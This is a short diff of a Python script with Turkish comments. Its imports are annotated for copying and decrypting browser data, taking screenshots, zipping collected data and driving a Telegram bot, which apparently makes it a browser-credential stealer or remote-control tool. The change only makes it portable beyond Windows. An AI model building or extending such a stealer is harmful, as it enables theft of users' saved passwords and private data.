@@ -21,8 +21,8 @@ import webbrowser           # Tarayıcıda bağlantı açtırmak için
 import subprocess           # Kill Process(İşlem Sonlandırma) Kullanmak için
 import shutil               # Tarayıcı verilerini kopyalamak için
 import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
-import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
-from PIL import ImageGrab   # Ekran görüntüsü almak için
+#import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için (Yalnızca Windows)
+#from PIL import ImageGrab   # Ekran görüntüsü almak için (MacOS ve Windows)
 import zipfile              # Topladığımız verileri Zip'lemek için
 #############################
 import telebot    # pyTelegramBotAPI
@@ -30,9 +30,13 @@ import telebot    # pyTelegramBotAPI
 
 ########################################################################################################################
 ## GenelDegiskenler
-kullanici_adi = os.getlogin()                                                   # Kullanıcı Adı
-bilgisayar_adi = platform.node()                                                # Bilgisayar Adı
-oturum = kullanici_adi + "@" + bilgisayar_adi                                   # Örn.: "kekik@Administrator"
+try:
+    kullanici_adi = os.getlogin()                                     # Kullanıcı Adı
+except:
+    import pwd
+    kullanici_adi = pwd.getpwuid(os.geteuid())[0]                     # Kullanıcı Adı
+bilgisayar_adi = platform.node()                                      # Bilgisayar Adı
+oturum = kullanici_adi + "@" + bilgisayar_adi                         # Örn.: "kekik@Administrator"
 
 isletim_sistemi = platform.system()                                             # İşletim Sistemi
 bellenim_surumu = platform.release()                                            # Sistem Bellenim Sürümü
